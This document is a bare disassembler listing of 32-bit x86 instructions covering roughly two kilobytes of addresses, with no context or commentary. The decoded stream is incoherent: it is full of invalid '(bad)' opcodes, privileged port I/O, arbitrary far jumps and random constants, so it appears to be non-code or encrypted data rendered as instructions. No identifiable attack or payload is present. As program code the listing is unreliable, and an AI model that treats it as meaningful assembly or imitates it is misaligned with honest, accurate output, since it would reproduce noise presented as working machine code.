  40da92:	push   ecx
  40da93:	sahf   
  40da94:	mov    ebp,ebp
  40da96:	push   ebx
  40da97:	inc    ebx
  40da98:	ret    0x7f70
  40da9b:	in     al,0x92
  40da9d:	inc    esi
  40da9e:	pushf  
  40da9f:	xor    ebp,DWORD PTR ds:[esi]
  40daa2:	ds aas 
  40daa4:	jecxz  0x40daa5
  40daa6:	jg     0x40db1b
  40daa8:	jns    0x40daee
  40daaa:	imul   BYTE PTR [ecx]
  40daac:	les    edi,FWORD PTR ds:0xeeb6501b
  40dab2:	add    ecx,ecx
  40dab4:	retf   0xadc
  40dab7:	not    DWORD PTR [eax+0x73fb9b8f]
  40dabd:	mov    BYTE PTR cs:[edi+0x2b],ch
  40dac1:	or     eax,0x1b770137
  40dac6:	daa    
  40dac7:	sti    
  40dac8:	fiadd  WORD PTR [ecx+eax*1+0x4d]
  40dacc:	test   eax,0x4a4373b5
  40dad1:	lock jns 0x40db10
  40dad4:	cmp    ch,bl
  40dad6:	ror    DWORD PTR [edx-0x70d3a36e],0x26
  40dadd:	xor    DWORD PTR [esi],edi
  40dadf:	sbb    BYTE PTR [esi+0x4b6db8ca],dl
  40dae5:	retf   0xa844
  40dae8:	cdq    
  40dae9:	neg    dl
  40daeb:	test   eax,0x773f3d16
  40daf0:	xchg   edx,esi
  40daf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daf3:	push   ds
  40daf4:	popf   
  40daf5:	add    BYTE PTR [edx+0x2944cb6b],dh
  40dafb:	call   0x977b70
  40db00:	je     0x40daab
  40db02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db03:	stos   BYTE PTR es:[edi],al
  40db04:	push   eax
  40db05:	bound  edx,QWORD PTR [eax-0x72]
  40db08:	popf   
  40db09:	xchg   ebx,eax
  40db0a:	adc    dh,BYTE PTR [edx+0x43]
  40db0d:	dec    ecx
  40db0e:	push   edi
  40db0f:	dec    esi
  40db10:	les    esi,FWORD PTR [ebp+ebx*2+0x4c]
  40db14:	test   edi,edx
  40db16:	or     esi,edi
  40db18:	adc    BYTE PTR [eax-0x6fa92707],ah
  40db1e:	outs   dx,BYTE PTR ds:[esi]
  40db1f:	fs mov ecx,0xdfd80089
  40db25:	mov    ch,0x4a
  40db27:	add    DWORD PTR [esi+edx*2-0x2d585212],ebx
  40db2e:	sbb    DWORD PTR [ebp+0x67],0xfffffff2
  40db32:	add    al,0x9
  40db34:	push   es
  40db35:	mov    bl,0x72
  40db37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db38:	mov    bl,cl
  40db3a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40db3c:	rol    bl,0xdd
  40db3f:	mov    es,WORD PTR [edx]
  40db41:	mov    al,ds:0x2579f3fb
  40db46:	dec    edi
  40db47:	int3   
  40db48:	cli    
  40db49:	and    esp,DWORD PTR [edi]
  40db4b:	mov    al,0x33
  40db4d:	call   0x108149a3
  40db52:	xlat   BYTE PTR ds:[ebx]
  40db53:	xor    al,0x39
  40db55:	inc    ebp
  40db56:	je     0x40db00
  40db58:	add    al,0x5e
  40db5a:	call   0x506321b4
  40db5f:	mov    WORD PTR [edx+0x38fe0e44],ss
  40db65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db66:	loopne 0x40dbcb
  40db68:	les    ebp,FWORD PTR [ebx]
  40db6a:	or     ah,al
  40db6c:	xchg   DWORD PTR [ebx+0x42e8b073],ecx
  40db72:	mov    ch,0x16
  40db74:	out    dx,al
  40db75:	ins    DWORD PTR es:[edi],dx
  40db76:	inc    edx
  40db77:	(bad)  
  40db78:	mov    DWORD PTR [edx],esi
  40db7a:	fs jg  0x40dbfc
  40db7d:	pop    ss
  40db7e:	pop    esi
  40db7f:	jnp    0x40db6f
  40db81:	or     dh,dh
  40db83:	inc    ebp
  40db84:	repnz popw ds
  40db87:	es or  dl,al
  40db8a:	jge    0x40db54
  40db8c:	sub    BYTE PTR [eax],cl
  40db8e:	bound  ecx,QWORD PTR [edi-0x20]
  40db91:	or     al,0xd6
  40db93:	push   esi
  40db94:	fld    QWORD PTR [esi]
  40db96:	call   0x39e4:0x34fac58a
  40db9d:	out    dx,eax
  40db9e:	in     al,dx
  40db9f:	(bad)  
  40dba1:	in     al,dx
  40dba2:	jmp    0x607c:0x518ef2ff
  40dba9:	dec    ecx
  40dbaa:	test   eax,0x56cc0270
  40dbaf:	pop    ebx
  40dbb0:	jnp    0x40dc14
  40dbb2:	inc    eax
  40dbb3:	jmp    0xb3c4:0x77f2d3e7
  40dbba:	and    eax,0x9bb6f9cf
  40dbbf:	xchg   edi,eax
  40dbc0:	pusha  
  40dbc1:	inc    ecx
  40dbc2:	stos   DWORD PTR es:[edi],eax
  40dbc3:	cli    
  40dbc4:	int3   
  40dbc5:	or     edi,ebp
  40dbc7:	ret    0xd017
  40dbca:	lahf   
  40dbcb:	and    edx,DWORD PTR [ebx+0x7e]
  40dbce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbcf:	xor    eax,DWORD PTR [ebp+eax*2-0x30381f3]
  40dbd6:	adc    BYTE PTR [eax-0x773c760],dh
  40dbdc:	loope  0x40dc2c
  40dbde:	jl     0x40dc25
  40dbe0:	shl    DWORD PTR [ecx-0xf02b838],0x64
  40dbe7:	xor    eax,0xe3b6293a
  40dbec:	dec    ecx
  40dbed:	pushf  
  40dbee:	dec    esp
  40dbef:	imul   esi,esi,0x23b80e
  40dbf5:	mov    bh,0xc5
  40dbf7:	cmp    ebx,DWORD PTR [ebx-0x24f464c0]
  40dbfd:	fs mov ah,0xcd
  40dc00:	nop
  40dc01:	nop
  40dc02:	(bad)  [edi-0x67]
  40dc05:	jecxz  0x40dba9
  40dc07:	sub    eax,0x63eb1f1c
  40dc0c:	mov    al,ds:0x7fe00bb4
  40dc11:	jbe    0x40dc1d
  40dc13:	mov    ebx,0xf1911c5e
  40dc18:	mov    al,ds:0x26f5b3e0
  40dc1d:	dec    edx
  40dc1e:	rol    BYTE PTR [ebp-0xcd126b0],cl
  40dc24:	cmp    eax,DWORD PTR [edi+0x128eaa5]
  40dc2a:	out    dx,eax
  40dc2b:	leave  
  40dc2c:	repnz push ebx
  40dc2e:	adc    DWORD PTR [eax-0x57ea8c17],esi
  40dc34:	cmp    al,0xe8
  40dc36:	sbb    dh,al
  40dc38:	lods   al,BYTE PTR ds:[esi]
  40dc39:	lds    ecx,FWORD PTR [ebx-0x45effae9]
  40dc3f:	cmp    bl,BYTE PTR [edi]
  40dc41:	cmp    DWORD PTR [ebp+0x53],esi
  40dc44:	sub    BYTE PTR [esi+0x762cb0fa],bh
  40dc4a:	sbb    edi,esi
  40dc4c:	ja     0x40dbf2
  40dc4e:	mov    esi,0xd3171cdf
  40dc53:	loop   0x40dc30
  40dc55:	int3   
  40dc56:	jge    0x40dc07
  40dc58:	icebp  
  40dc59:	cmp    BYTE PTR [eax+0x3d],ch
  40dc5c:	mov    dh,0x93
  40dc5e:	jge    0x40dcc6
  40dc60:	inc    ebx
  40dc61:	pop    ecx
  40dc62:	pop    edx
  40dc63:	inc    eax
  40dc64:	hlt    
  40dc65:	jp     0x40dc18
  40dc67:	stc    
  40dc68:	mov    ds:0xe589ea0d,eax
  40dc6d:	mov    esi,0x2dfe112c
  40dc72:	retf   0xb028
  40dc75:	(bad)  
  40dc76:	fistp  WORD PTR [ecx+0x439ce761]
  40dc7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc7d:	jle    0x40dc6b
  40dc7f:	test   al,0x73
  40dc81:	push   ss
  40dc82:	cmp    edx,ecx
  40dc84:	mov    eax,ds:0xce6541f0
  40dc89:	fcom   DWORD PTR [eax+0x1]
  40dc8c:	xchg   edx,eax
  40dc8d:	xor    BYTE PTR [esi-0x33c22051],ah
  40dc93:	bound  ebp,QWORD PTR [ecx+ecx*2-0x3c3af177]
  40dc9a:	adc    DWORD PTR [ecx-0x46454472],ebp
  40dca0:	adc    dh,ch
  40dca2:	stc    
  40dca3:	stc    
  40dca4:	loop   0x40dca8
  40dca6:	adc    BYTE PTR [ecx],ah
  40dca8:	ins    DWORD PTR es:[edi],dx
  40dca9:	(bad)  
  40dcab:	xchg   ebx,eax
  40dcac:	jbe    0x40dcaf
  40dcae:	dec    esp
  40dcaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb0:	call   0xfddbf4fb
  40dcb5:	xor    bh,dl
  40dcb7:	jle    0x40dc7d
  40dcb9:	jmp    0x6145:0x6a36e993
  40dcc0:	mov    edx,0xa49ca604
  40dcc5:	adc    eax,0xfac37a9e
  40dcca:	idiv   ebx
  40dccc:	shl    DWORD PTR [ebx+0x728527df],1
  40dcd2:	inc    edx
  40dcd3:	push   ebx
  40dcd4:	dec    esi
  40dcd5:	xchg   esp,eax
  40dcd6:	sub    al,0x11
  40dcd8:	or     al,0x8b
  40dcda:	shl    BYTE PTR [ebx-0x73],cl
  40dcdd:	dec    eax
  40dcde:	out    dx,al
  40dcdf:	cld    
  40dce0:	pop    ebx
  40dce1:	push   ebp
  40dce2:	adc    BYTE PTR [ecx],dl
  40dce4:	loope  0x40dd4d
  40dce6:	mov    eax,0xe2f66f4f
  40dceb:	data16 daa 
  40dced:	ss out dx,al
  40dcef:	std    
  40dcf0:	mov    al,ds:0x3abebc32
  40dcf5:	aaa    
  40dcf6:	popf   
  40dcf7:	sbb    cl,BYTE PTR [edi+esi*4-0x20]
  40dcfb:	inc    edi
  40dcfc:	inc    edi
  40dcfd:	pushf  
  40dcfe:	retf   0xdc54
  40dd01:	outs   dx,BYTE PTR ds:[esi]
  40dd02:	cld    
  40dd03:	test   eax,0xd3c0e7f7
  40dd08:	fld    DWORD PTR [eax]
  40dd0a:	iret   
  40dd0b:	dec    edi
  40dd0c:	das    
  40dd0d:	inc    edi
  40dd0e:	ins    BYTE PTR es:[edi],dx
  40dd0f:	out    dx,eax
  40dd10:	cwde   
  40dd11:	sub    BYTE PTR [eax+0x38029497],al
  40dd17:	adc    cl,cl
  40dd19:	mov    WORD PTR [esi-0x28],?
  40dd1c:	shl    DWORD PTR [edx],1
  40dd1e:	(bad)  
  40dd20:	mov    WORD PTR [edx+0x6ca77660],ss
  40dd26:	lahf   
  40dd27:	xchg   bh,dh
  40dd29:	sbb    eax,0x6cb0ca8b
  40dd2e:	inc    ecx
  40dd2f:	test   DWORD PTR [edi*8-0x2064b05c],edx
  40dd36:	xor    DWORD PTR [ecx+0x597e15b2],ecx
  40dd3c:	in     al,0x8c
  40dd3e:	or     dl,BYTE PTR [esi+esi*8]
  40dd41:	and    al,0x65
  40dd43:	sar    DWORD PTR [edi-0x2fd7dd87],1
  40dd49:	xchg   edi,eax
  40dd4a:	sti    
  40dd4b:	ficomp DWORD PTR [edi+0x5dc618e9]
  40dd51:	fwait
  40dd52:	out    0xe3,al
  40dd54:	mov    dh,0x5
  40dd56:	mov    ecx,0x54747c38
  40dd5b:	adc    al,0xc4
  40dd5d:	stos   BYTE PTR es:[edi],al
  40dd5e:	int    0xd5
  40dd60:	mov    dl,0xd9
  40dd62:	xchg   BYTE PTR [ebp-0x133791e5],cl
  40dd68:	xchg   esi,eax
  40dd69:	xchg   DWORD PTR [ebx-0x22667cfe],esp
  40dd6f:	cmc    
  40dd70:	ds in  eax,0xe7
  40dd73:	popf   
  40dd74:	pop    edx
  40dd75:	pop    ss
  40dd76:	mov    DWORD PTR ds:0x358116e1,0xf368dc6c
  40dd80:	push   0x4dd66247
  40dd85:	push   ds
  40dd86:	mov    dh,0xc0
  40dd88:	ficom  DWORD PTR [esi-0x4015eb31]
  40dd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd8f:	adc    al,0xbc
  40dd91:	enter  0x4b4,0x76
  40dd95:	fadd   st,st(7)
  40dd97:	out    0x47,al
  40dd99:	test   al,0xf1
  40dd9b:	stos   DWORD PTR es:[edi],eax
  40dd9c:	push   edi
  40dd9d:	sti    
  40dd9e:	shl    DWORD PTR ds:0xbf170ea7,1
  40dda4:	mov    ebp,0x874bd31a
  40dda9:	push   eax
  40ddaa:	mov    al,0xb5
  40ddac:	pop    es
  40ddad:	popf   
  40ddae:	(bad)  
  40ddaf:	out    0x9,eax
  40ddb1:	stos   DWORD PTR es:[edi],eax
  40ddb2:	int    0x76
  40ddb4:	jp     0x40dd88
  40ddb6:	das    
  40ddb7:	and    eax,0x3d6b9ac4
  40ddbc:	fsub   DWORD PTR [eax+eiz*4-0x61c2b6c1]
  40ddc3:	popf   
  40ddc4:	ror    ch,0x4f
  40ddc7:	pushf  
  40ddc8:	push   0xb0e1384e
  40ddcd:	mov    ?,ecx
  40ddcf:	mov    bl,0x51
  40ddd1:	lock test eax,0x29810804
  40ddd7:	cld    
  40ddd8:	pop    ecx
  40ddd9:	int    0x3d
  40dddb:	cwde   
  40dddc:	adc    DWORD PTR ds:[ebx+0x1001e749],edx
  40dde3:	mov    edi,0x82559c48
  40dde8:	outs   dx,BYTE PTR ds:[esi]
  40dde9:	in     al,0xdf
  40ddeb:	ins    BYTE PTR es:[edi],dx
  40ddec:	std    
  40dded:	sar    ebp,cl
  40ddef:	add    BYTE PTR [edx],dh
  40ddf1:	xchg   ebp,eax
  40ddf2:	add    BYTE PTR [bx+di-0x3cf6],bl
  40ddf7:	sub    eax,0x3eb1101a
  40ddfc:	xlat   BYTE PTR ds:[ebx]
  40ddfd:	test   ah,cl
  40ddff:	mov    BYTE PTR [ebx-0x4e147537],cl
  40de05:	popa   
  40de06:	les    eax,FWORD PTR [ebp+edx*2-0x76de098f]
  40de0d:	call   DWORD PTR [eax+0x36]
  40de10:	jecxz  0x40de40
  40de12:	cmp    BYTE PTR [ecx],bl
  40de14:	mov    eax,ds:0x352b0a2
  40de19:	mov    esp,0x8719552e
  40de1e:	add    cl,ch
  40de20:	sbb    eax,0x7a1e2c94
  40de25:	inc    eax
  40de26:	or     DWORD PTR [ebp-0x7d],edi
  40de29:	aaa    
  40de2a:	and    DWORD PTR [ecx],edx
  40de2c:	adc    DWORD PTR [edi+0x6e],edi
  40de2f:	sub    DWORD PTR [edx-0x3],esi
  40de32:	xchg   ebx,eax
  40de33:	loop   0x40de28
  40de35:	es or  edi,esp
  40de38:	xchg   edx,eax
  40de39:	cmp    al,0x75
  40de3b:	ret    
  40de3c:	cli    
  40de3d:	dec    edx
  40de3e:	pop    esp
  40de3f:	aam    0x34
  40de41:	sub    eax,0xdf7968c5
  40de46:	bnd jl 0x40de50
  40de49:	inc    esi
  40de4a:	aam    0x1a
  40de4c:	mov    cl,0xc3
  40de4e:	mov    ds:0x9e15a6fa,al
  40de53:	fldenv [esi+0x53]
  40de56:	jl     0x40dece
  40de58:	aas    
  40de59:	in     eax,dx
  40de5a:	xlat   BYTE PTR ds:[ebx]
  40de5b:	cmc    
  40de5c:	jnp    0x40deca
  40de5e:	call   0x6ac6da32
  40de63:	sub    eax,0xb4bf32d0
  40de68:	cmc    
  40de69:	xor    al,0x7a
  40de6b:	daa    
  40de6c:	xchg   ebx,eax
  40de6d:	js     0x40de92
  40de6f:	xchg   esp,eax
  40de70:	das    
  40de71:	in     al,0x1d
  40de73:	test   DWORD PTR [esi+edx*2-0x211fb762],ebx
  40de7a:	xchg   ebp,eax
  40de7b:	or     DWORD PTR [esp+esi*4],edi
  40de7e:	das    
  40de7f:	and    DWORD PTR [eax],edx
  40de81:	mov    edi,0x9084c949
  40de86:	jecxz  0x40deed
  40de88:	push   ds
  40de89:	hlt    
  40de8a:	out    0xe5,al
  40de8c:	jecxz  0x40de9f
  40de8e:	and    eax,0xd429d733
  40de93:	repz ror BYTE PTR [eax+0x18],cl
  40de97:	pop    ds
  40de98:	test   al,0xf1
  40de9a:	mov    esp,DWORD PTR [ecx-0x20]
  40de9d:	jecxz  0x40def4
  40de9f:	or     dh,BYTE PTR [eax+0x24b285b7]
  40dea5:	cmc    
  40dea6:	stc    
  40dea7:	pop    edi
  40dea8:	retf   
  40dea9:	bound  ebp,QWORD PTR [eax]
  40deab:	fwait
  40deac:	pop    ebx
  40dead:	and    dl,cl
  40deaf:	in     eax,0xbc
  40deb1:	lods   eax,DWORD PTR ds:[esi]
  40deb2:	mov    bh,0x60
  40deb4:	jmp    0x1bb:0xfb9007cf
  40debb:	xlat   BYTE PTR ds:[ebx]
  40debc:	and    al,0x20
  40debe:	mov    bh,0xbe
  40dec0:	addr16 nop
  40dec2:	xor    BYTE PTR [esi],0x21
  40dec5:	inc    bx
  40dec7:	sbb    edi,DWORD PTR ds:0x2a6b6391
  40decd:	gs xor esi,eax
  40ded0:	(bad)  
  40ded1:	adc    edx,DWORD PTR [edx]
  40ded3:	out    dx,al
  40ded4:	(bad)
  40ded9:	mov    ch,0x2
  40dedb:	push   ecx
  40dedc:	sbb    DWORD PTR [edx+0x65f42363],esi
  40dee2:	mov    al,gs:0x78b9a5a6
  40dee8:	outs   dx,BYTE PTR ds:[esi]
  40dee9:	pop    ebx
  40deea:	push   ds
  40deeb:	out    0x55,al
  40deed:	adc    al,0xe0
  40deef:	(bad)  
  40def0:	not    esp
  40def2:	pusha  
  40def3:	push   DWORD PTR [esi-0x2e283f0]
  40def9:	mov    ds:0xab9b0a00,al
  40defe:	and    eax,0x33099655
  40df03:	mov    esp,0x1e00a27
  40df08:	and    bh,ah
  40df0a:	pop    esi
  40df0b:	mov    BYTE PTR [edx-0x7027a0d1],0x9c
  40df12:	stos   BYTE PTR es:[edi],al
  40df13:	add    dh,dl
  40df15:	mov    bl,0xa2
  40df18:	inc    ebp
  40df19:	jns    0x40ded3
  40df1b:	call   0x52849ce5
  40df20:	jmp    0x6727e2c9
  40df25:	ja     0x40df04
  40df27:	es push edi
  40df29:	das    
  40df2a:	push   0x7b
  40df2c:	mov    dl,0x4d
  40df2e:	sub    esp,DWORD PTR [esi+0xa]
  40df31:	mov    edi,0xc730829b
  40df36:	add    eax,0x36064998
  40df3b:	test   eax,0x543feaff
  40df40:	xchg   edx,esp
  40df42:	xchg   esi,eax
  40df43:	adc    bh,BYTE PTR [eax-0x6a]
  40df46:	sub    dl,BYTE PTR [edi]
  40df48:	call   0x6386e6a5
  40df4d:	dec    ebp
  40df4e:	clc    
  40df4f:	imul   DWORD PTR [edi-0x61]
  40df52:	add    bh,0xcf
  40df55:	shr    DWORD PTR [esi+0x2b],cl
  40df58:	xor    BYTE PTR ds:0xbe574c19,dl
  40df5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df5f:	jo     0x40def4
  40df61:	cmc    
  40df62:	jg     0x40dfc9
  40df64:	and    BYTE PTR [edx-0x491cd7c2],bl
  40df6a:	xchg   esi,eax
  40df6b:	bound  edx,QWORD PTR [ecx-0x54]
  40df6e:	je     0x40deff
  40df70:	js     0x40df32
  40df72:	or     bl,BYTE PTR [edi]
  40df74:	xor    ebp,DWORD PTR [edx]
  40df76:	sar    BYTE PTR [eax+eax*4+0x11460b85],0xbe
  40df7e:	data16 lock ror BYTE PTR ds:[ecx+0x64],0xed
  40df85:	lahf   
  40df86:	nop
  40df87:	and    ch,BYTE PTR [ecx]
  40df89:	fsub   QWORD PTR [ecx+0x67]
  40df8c:	cli    
  40df8d:	mov    ecx,0xee00195a
  40df92:	cmp    BYTE PTR cs:[ebp-0x1718fc48],0xab
  40df9a:	stc    
  40df9b:	jns    0x40e010
  40df9d:	or     al,0x3
  40df9f:	(bad)  
  40dfa0:	jmp    esi
  40dfa2:	cmp    BYTE PTR [edx+0x6eb9926e],bl
  40dfa8:	cs dec ebp
  40dfaa:	pop    ecx
  40dfab:	jg     0x40df63
  40dfad:	lods   eax,DWORD PTR ds:[esi]
  40dfae:	dec    ecx
  40dfaf:	pmaxsw mm2,QWORD PTR [edi-0x6a]
  40dfb3:	lahf   
  40dfb4:	jns    0x40dfa8
  40dfb6:	mov    ebx,0x7f0ef553
  40dfbb:	jae    0x40e01f
  40dfbd:	or     al,0xd3
  40dfbf:	stos   BYTE PTR es:[edi],al
  40dfc0:	out    dx,eax
  40dfc1:	push   esp
  40dfc2:	add    dl,bl
  40dfc4:	call   0x1d9e:0x9528773f
  40dfcb:	jno    0x40df61
  40dfcd:	daa    
  40dfce:	jae    0x40e016
  40dfd0:	test   al,0x1c
  40dfd2:	cmc    
  40dfd3:	test   eax,0xcef9c542
  40dfd8:	sbb    cl,BYTE PTR es:[esi+0x2c1284e5]
  40dfdf:	repnz add BYTE PTR [ebx-0x4da7eafd],ch
  40dfe6:	mov    ch,0xd
  40dfe8:	pop    es
  40dfe9:	xchg   BYTE PTR [edx-0x48ae9317],dl
  40dfef:	jne    0x40e053
  40dff1:	or     esi,DWORD PTR [esi+0x66e0639]
  40dff7:	ret    0x135e
  40dffa:	outs   dx,BYTE PTR ds:[esi]
  40dffb:	popa   
  40dffc:	dec    esi
  40dffd:	adc    ebp,ebp
  40dfff:	push   0xcf6d9fff
  40e004:	ds (bad) 
  40e006:	xlat   BYTE PTR ds:[ebx]
  40e007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e008:	xor    esp,ebx
  40e00a:	pop    ds
  40e00b:	mov    WORD PTR [ecx+0x61],cs
  40e00e:	xlat   BYTE PTR ds:[ebx]
  40e00f:	scas   eax,DWORD PTR es:[edi]
  40e010:	test   BYTE PTR cs:[ebx-0x23],0x4c
  40e015:	out    0x71,al
  40e017:	cmp    al,0xde
  40e019:	xor    eax,0x45fd2e99
  40e01e:	inc    ebp
  40e01f:	inc    eax
  40e020:	in     eax,0xc0
  40e022:	jnp    0x40e036
  40e024:	jge    0x40dff4
  40e026:	shr    DWORD PTR [ecx-0x532ef15d],0xdc
  40e02d:	push   0x14b8e922
  40e032:	xchg   ch,cl
  40e034:	adc    edi,DWORD PTR [esi]
  40e036:	in     eax,dx
  40e037:	mov    al,dh
  40e039:	cmp    al,0x8c
  40e03b:	outs   dx,DWORD PTR ds:[esi]
  40e03c:	sub    al,ah
  40e03e:	ret    0x7ada
  40e041:	clc    
  40e042:	(bad)  
  40e043:	sub    al,0x45
  40e045:	mov    ds:0x7ffa14f7,al
  40e04a:	jb     0x40e098
  40e04c:	push   edx
  40e04d:	out    0xdd,al
  40e04f:	mov    ds:0xe62fba65,al
  40e054:	mov    esp,0x45583566
  40e059:	inc    ecx
  40e05a:	int    0xce
  40e05c:	cdq    
  40e05d:	int3   
  40e05e:	lods   eax,DWORD PTR ds:[esi]
  40e05f:	pop    esi
  40e060:	in     al,0x5a
  40e062:	add    DWORD PTR [eax-0x66029256],esi
  40e068:	outs   dx,BYTE PTR ds:[esi]
  40e069:	sub    al,0x51
  40e06b:	fidiv  DWORD PTR ds:[ecx-0x6aaad896]
  40e072:	pop    es
  40e073:	xor    DWORD PTR [eax+0x2e401231],0x5f9d6aa0
  40e07d:	lods   al,BYTE PTR ds:[esi]
  40e07e:	cmp    al,0x61
  40e080:	call   FWORD PTR [edi+0x674a12ff]
  40e086:	ret    0xac2d
  40e089:	mov    cs,WORD PTR [ebx]
  40e08b:	add    DWORD PTR [ebp-0x7b],0x27d93e10
  40e092:	ffreep st(5)
  40e094:	dec    edx
  40e095:	shr    DWORD PTR [ebx-0x75],0x21
  40e099:	cdq    
  40e09a:	jae    0x40e078
  40e09c:	aaa    
  40e09d:	jg     0x40e0e0
  40e09f:	dec    ebx
  40e0a0:	sbb    DWORD PTR [edx-0x18e74f5],edx
  40e0a6:	daa    
  40e0a7:	ss loop 0x40e09f
  40e0aa:	(bad)  
  40e0ab:	dec    BYTE PTR [ecx+0x12]
  40e0ae:	(bad)  
  40e0af:	and    edi,DWORD PTR ss:[ebx+eiz*2]
  40e0b3:	ror    DWORD PTR [ebx+0x4f677f9b],cl
  40e0b9:	pushf  
  40e0ba:	mov    ecx,0x9da0dde8
  40e0bf:	stc    
  40e0c0:	fdiv   st,st(6)
  40e0c2:	jno    0x40e091
  40e0c4:	dec    ecx
  40e0c5:	mov    bh,0x21
  40e0c7:	mov    al,0x56
  40e0c9:	add    dh,ah
  40e0cb:	sbb    BYTE PTR [ecx+0x45c16340],dh
  40e0d1:	imul   ebp,DWORD PTR gs:[ebx-0x33],0x62f7d2f6
  40e0d9:	js     0x40e0b5
  40e0db:	xchg   ebx,eax
  40e0dc:	xchg   edi,eax
  40e0dd:	fdivrp st(4),st
  40e0df:	inc    ecx
  40e0e0:	push   cs
  40e0e1:	inc    eax
  40e0e2:	ds out dx,eax
  40e0e4:	sbb    DWORD PTR ds:0x1fe4cecd,edx
  40e0ea:	cs ins BYTE PTR es:[edi],dx
  40e0ec:	sub    cl,BYTE PTR [ecx+0x311384c6]
  40e0f2:	inc    eax
  40e0f3:	imul   edi,DWORD PTR [edi*2+0x7efd2ab0],0x15013e6
  40e0fe:	push   eax
  40e0ff:	sbb    DWORD PTR [edx],esi
  40e101:	sub    edx,ebp
  40e103:	test   al,0x91
  40e105:	call   0x7c51a57b
  40e10a:	aaa    
  40e10b:	xor    al,0x64
  40e10d:	or     edi,DWORD PTR [ebx+0x13f76c7e]
  40e113:	enter  0xe4b4,0xfa
  40e117:	cmp    ebx,ebp
  40e119:	mov    ds:0x77d6bd25,al
  40e11e:	cwde   
  40e11f:	push   esi
  40e120:	rcl    DWORD PTR [esi-0x74],1
  40e123:	ja     0x40e0b9
  40e125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e126:	jmp    0x7e9e:0xc96695f7
  40e12d:	mov    edx,0xe3951b01
  40e132:	retf   
  40e133:	and    bl,BYTE PTR [eax]
  40e135:	cmc    
  40e136:	repz out 0x28,al
  40e139:	jmp    0x40e178
  40e13b:	and    BYTE PTR [edx],al
  40e13d:	jge    0x40e19d
  40e13f:	gs aaa 
  40e141:	xor    BYTE PTR [edi+ebp*1+0x797cc2c2],bl
  40e148:	out    0xca,al
  40e14a:	mov    DWORD PTR [ebx-0x1908e79d],0xad1be64b
  40e154:	ds dec ecx
  40e156:	push   ebx
  40e157:	out    dx,al
  40e158:	add    ah,BYTE PTR [ecx+ebx*1]
  40e15b:	enter  0x11bc,0xa
  40e15f:	(bad)  
  40e160:	sbb    ebp,edx
  40e162:	or     ebp,DWORD PTR [edi+0x5484e65e]
  40e168:	scas   eax,DWORD PTR es:[edi]
  40e169:	fnsave [ecx+0x1c]
  40e16c:	(bad)  [esi]
  40e16e:	xchg   edx,eax
  40e16f:	xchg   edx,eax
  40e170:	cmp    ebp,DWORD PTR [edi-0x5e647629]
  40e176:	rcl    bh,1
  40e178:	or     al,0xab
  40e17a:	outs   dx,DWORD PTR ds:[esi]
  40e17b:	mov    dh,0x71
  40e17d:	mov    al,0xd7
  40e17f:	xchg   ebx,eax
  40e180:	mov    ebp,0x5f46027e
  40e185:	dec    ebp
  40e186:	push   edi
  40e187:	stc    
  40e188:	sub    BYTE PTR [edi+0x4ff646ae],0xe
  40e18f:	retf   0x859
  40e192:	adc    ebx,DWORD PTR [ecx-0x32]
  40e195:	pop    ecx
  40e196:	xchg   ecx,eax
  40e197:	pop    es
  40e198:	es cmp al,0x58
  40e19b:	add    DWORD PTR [edx+edi*4-0x20c189a],0xbd6b4023
  40e1a6:	pand   mm7,QWORD PTR [ebx+0x42]
  40e1aa:	push   0x9ec98b1b
  40e1af:	push   es
  40e1b0:	mov    edx,0xcf42f00
  40e1b5:	arpl   WORD PTR [ebp-0x56],bx
  40e1b8:	or     al,0x3c
  40e1ba:	dec    ebx
  40e1bb:	mov    BYTE PTR [ebx-0x680437e0],dh
  40e1c1:	push   esp
  40e1c2:	bound  edi,QWORD PTR [ecx+0x72]
  40e1c5:	adc    bh,BYTE PTR [edi]
  40e1c7:	ds sbb al,0xc2
  40e1ca:	push   es
  40e1cb:	in     eax,0x2
  40e1cd:	lods   eax,DWORD PTR ds:[esi]
  40e1ce:	sub    al,0x51
  40e1d0:	jecxz  0x40e185
  40e1d2:	into   
  40e1d3:	test   eax,0xf37f9129
  40e1d8:	push   edx
  40e1d9:	adc    al,0xd4
  40e1db:	push   esi
  40e1dc:	and    bh,bh
  40e1de:	shl    BYTE PTR [ecx-0xc],0xff
  40e1e2:	shl    DWORD PTR [esi-0x14],cl
  40e1e5:	sbb    cl,BYTE PTR [edx+edi*4-0x1a]
  40e1e9:	retf   
  40e1ea:	cwde   
  40e1eb:	mov    bh,0xb4
  40e1ed:	add    dh,BYTE PTR [eax-0x35]
  40e1f0:	add    esi,DWORD PTR [eax+0x2a6dde3]
  40e1f6:	call   0xfb6bb2d4
  40e1fb:	fcmovnu st,st(1)
  40e1fd:	cwde   
  40e1fe:	add    al,0xc4
  40e200:	hlt    
  40e201:	ret    
  40e202:	mov    dh,0xde
  40e204:	pop    eax
  40e205:	cmp    cl,BYTE PTR [edi]
  40e207:	loopne 0x40e244
  40e209:	dec    edi
  40e20a:	push   es
  40e20b:	and    eax,0xcac1777d
  40e210:	inc    edx
  40e211:	adc    DWORD PTR [edx+0x36],esi
  40e214:	or     bh,BYTE PTR [edx]
  40e216:	dec    ebx
  40e217:	inc    eax
  40e218:	jae    0x40e19d
  40e21a:	int3   
  40e21b:	retf   0x7e4d
  40e21e:	les    ebx,FWORD PTR [edx+0x2b]
  40e221:	nop
  40e222:	fstp   TBYTE PTR [esi]
  40e224:	sub    bh,cl
  40e226:	sar    edx,cl
  40e228:	sub    esp,DWORD PTR [ebp+0x27173b8d]
  40e22e:	inc    ebp
  40e22f:	clc    
  40e230:	imul   esi,ebp,0xc86a51d8
  40e236:	sti    
  40e237:	dec    esi
  40e238:	stc    
  40e239:	icebp  
  40e23a:	mov    edi,ebp
  40e23c:	scas   al,BYTE PTR es:[edi]
  40e23d:	xchg   edi,edi
  40e23f:	mov    bl,0xcf
  40e241:	dec    ebx
  40e242:	inc    ecx
